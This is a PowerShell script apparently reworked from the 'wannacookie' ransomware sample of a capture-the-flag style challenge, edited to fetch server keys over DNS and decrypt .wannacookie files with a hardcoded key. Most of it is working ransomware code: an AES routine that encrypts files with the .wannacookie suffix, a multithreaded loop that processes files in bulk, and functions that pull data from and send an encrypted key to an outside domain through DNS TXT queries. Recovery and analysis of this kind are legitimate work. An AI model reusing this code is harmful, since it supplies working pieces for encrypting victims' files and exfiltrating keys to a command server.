function e_d_file($key, $File, $enc_it) {
        [byte[]]$key = $key;
        $Suffix = "`.wannacookie";
        [System.Reflection.Assembly]::LoadWithPartialName('System.Security.Cryptography');
        [System.Int32]$KeySize = $key.Length*8;
        $AESP = New-Object 'System.Security.Cryptography.AesManaged';
        $AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;
        $AESP.BlockSize = 128;
        $AESP.KeySize = $KeySize;
        $AESP.Key = $key;
        $FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open);
        if ($enc_it) {
            $DestFile = $File + $Suffix
        }
        else {
            $DestFile = ($File -replace $Suffix)
        }
        ;
        $FileSW = New-Object System.IO.FileStream($DestFile, [System.IO.FileMode]::Create);
        if ($enc_it) {
            $AESP.GenerateIV();
            $FileSW.Write([System.BitConverter]::GetBytes($AESP.IV.Length), 0, 4);
            $FileSW.Write($AESP.IV, 0, $AESP.IV.Length);
            $Transform = $AESP.CreateEncryptor()
        }
        else {
            [Byte[]]$LenIV = New-Object Byte[] 4;
            $FileSR.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null;
            $FileSR.Read($LenIV,  0, 3) | Out-Null;
            [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0);
            [Byte[]]$IV = New-Object Byte[] $LIV;
            $FileSR.Seek(4, [System.IO.SeekOrigin]::Begin) | Out-Null;
            $FileSR.Read($IV, 0, $LIV) | Out-Null;
            $AESP.IV = $IV;
            $Transform = $AESP.CreateDecryptor()
        }
        ;
        $CryptoS = New-Object System.Security.Cryptography.CryptoStream($FileSW, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write);
        [Int]$Count = 0;
        [Int]$BlockSzBts = $AESP.BlockSize / 8;
        [Byte[]]$Data = New-Object Byte[] $BlockSzBts;
        Do {
            $Count = $FileSR.Read($Data, 0, $BlockSzBts);
            $CryptoS.Write($Data, 0, $Count)
        }
        While ($Count -gt 0);
        $CryptoS.FlushFinalBlock();
        $CryptoS.Close();
        $FileSR.Close();
        $FileSW.Close();
        Clear-variable -Name "key";
        #Remove-Item $File
};

function H2B {
    param($HX);
    $HX = $HX -split '(..)' | ? {
        $_
    };
    ForEach ($value in $HX){
        [Convert]::ToInt32($value,16)
    }
};

function A2H(){
    Param($a);
    $c = '';
    $b = $a.ToCharArray();
    ;
    Foreach ($element in $b) {
        $c = $c + " " + [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($element))
    };
    return $c -replace ' '
};

function H2A() {
    Param($a);
    $outa;
    $a -split '(..)' | ? {
        $_
    } | forEach {
        [char]([convert]::toint16($_,16))
    } | forEach {
        $outa = $outa + $_
    };
    return $outa
};

function B2H {
    param($DEC);
    $tmp = '';
    ForEach ($value in $DEC){
        $a = "{0:x}" -f [Int]$value;
        if ($a.length -eq 1){
            $tmp += '0' + $a
        }
        else {
            $tmp += $a
        }
    };
    return $tmp
};

function ti_rox {
    param($b1, $b2);
    $b1 = $(H2B $b1);
    $b2 = $(H2B $b2);
    $cont = New-Object Byte[] $b1.count;
    if ($b1.count -eq $b2.count) {
        for($i=0;
        $i -lt $b1.count ;
        $i++) {
            $cont[$i] = $b1[$i] -bxor $b2[$i]
        }
    };
    return $cont
};

function B2G {
    param([byte[]]$Data);
    Process {
        $out = [System.IO.MemoryStream]::new();
        $gStream = New-Object System.IO.Compression.GzipStream $out, ([IO.Compression.CompressionMode]::Compress);
        $gStream.Write($Data, 0, $Data.Length);
        $gStream.Close();
        return $out.ToArray()
    }
};

function G2B {
    param([byte[]]$Data);
    Process {
        $SrcData = New-Object System.IO.MemoryStream( , $Data );
        $output = New-Object System.IO.MemoryStream;
        $gStream = New-Object System.IO.Compression.GzipStream $SrcData, ([IO.Compression.CompressionMode]::Decompress);
        $gStream.CopyTo( $output );
        $gStream.Close();
        $SrcData.Close();
        [byte[]] $byteArr = $output.ToArray();
        return $byteArr
    }
};

function sh1([String] $String) {
    $SB = New-Object System.Text.StringBuilder;
    [System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String))|%{
        [Void]$SB.Append($_.ToString("x2"))
    }
    ;
    $SB.ToString()
};

function p_k_e($key_bytes, [byte[]]$pub_bytes){
    $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2;
    $cert.Import($pub_bytes);
    $encKey = $cert.PublicKey.Key.Encrypt($key_bytes, $true);
    return $(B2H $encKey)
};

function e_n_d {
    param($key, $allfiles, $make_cookie );
    $tcount = 12;
    for ( $file=0; $file -lt $allfiles.length; $file++  ) {
        while ($true) {
            $running = @(Get-Job | Where-Object {
                $_.State -eq 'Running'
            }
            );
            if ($running.Count -le $tcount) {
                Start-Job  -ScriptBlock {
                    param($key, $File, $true_false);
                    try{
                        "$key $File $false" | Out-File -FilePath $($env:userprofile+'\Desktop\ps_log.txt') -append
                        e_d_file $key $File $true_false
                        Write-Host "Success!"
                    }
                    catch {
                        $_.Exception.Message | Out-String | Out-File $($env:userprofile+'\Desktop\ps_log.txt') -append
                    }
                } -args $key, $allfiles[$file], $make_cookie -InitializationScript $functions;
                break
            }
            else {
                Start-Sleep -m 200;
                continue
            }
        }
    }
}
;
function g_o_dns($f) {
    $h = '';
    foreach ($i in 0..([convert]::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).Strings, 10)-1)) {
        $h += $(Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).Strings
        Out-File -FilePath $($f+'.hex') -Append -InputObject $h
    };
    $a = H2A($h)
    Out-File -FilePath $($f+'.html') -InputObject $a
    return (H2A $h)
}
;
function s_2_c($astring, $size=32) {
    $new_arr = @();
    $chunk_index=0;
    foreach($i in 1..$($astring.length / $size)) {
        $new_arr += @($astring.substring($chunk_index,$size));
        $chunk_index += $size
    }
    ;
    return $new_arr
}
;
function snd_k($enc_k) {
    $chunks = (s_2_c $enc_k );
    foreach ($j in $chunks) {
        if ($chunks.IndexOf($j) -eq 0) {
            $n_c_id = $(Resolve-DnsName -Server erohetfanu.com -Name "$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
        }
        else {
            $(Resolve-DnsName -Server erohetfanu.com -Name "$n_c_id.$j.6B6579666F72626F746964.erohetfanu.com" -Type TXT).Strings
        }
    }
    ;
    return $n_c_id
}
;
function get_encrytped_key_enc_key {
    
    $public_key = [System.Convert]::FromBase64String($(g_o_dns("7365727665722E637274") ) );
    $private_key = $(g_o_dns("7365727665722e6b6579") );
    $private_key_encryption_key = "3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971";

    $public_key | Out-file -FilePath "server.crt"
    $private_key | Out-file -FilePath "server.key"
    Write-Host "Private key (byte stream): " $private_key;
    Write-Host $private_key_encryption_key;
    Write-Host "Public key (byte stream): " $public_key;

    $d_t = (($(Get-Date).ToUniversalTime() | Out-String) -replace "`r`n");
    [array]$f_c = $(Get-ChildItem -Path $($env:userprofile) -Recurse  -Filter *.wannacookie | where {!$_.PSIsContainer} | Foreach-Object {
            $_.Fullname
        }
    );

    $decrypted_key = "fbcfc121915d99cc20a3d3d5d84f8308";
    $decrypted_key_bytes = $(H2B $decrypted_key);
    e_n_d $decrypted_key_bytes $f_c $false;

}

get_encrytped_key_enc_key;